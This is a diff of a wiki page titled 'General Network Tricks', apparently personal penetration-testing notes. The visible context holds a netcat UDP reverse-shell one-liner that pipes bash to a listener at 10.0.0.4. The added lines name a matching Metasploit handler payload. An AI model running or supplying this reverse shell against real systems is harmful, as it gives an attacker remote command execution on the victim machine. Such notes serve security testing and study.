@@ -2,7 +2,7 @@
 title: General Network Tricks
 description: A quick summary of Generalnetworktricks
 published: true
-date: 2023-01-28T18:14:58.426Z
+date: 2023-01-28T22:21:24.093Z
 tags: 
 editor: markdown
 dateCreated: 2022-10-01T21:19:34.651Z
@@ -30,3 +30,8 @@ note the HI is there so that the listener will open the connection. It will then
 ```
 rm fifo; mkfifo fifo; nc -u 10.0.0.4 9998 < fifo | { echo "HI"; bash; } > fifo 2>&1  
 ```
+The following is a good metasploit handler for these:
+```
+payload/cmd/unix/reverse_bash_udp
+```
+
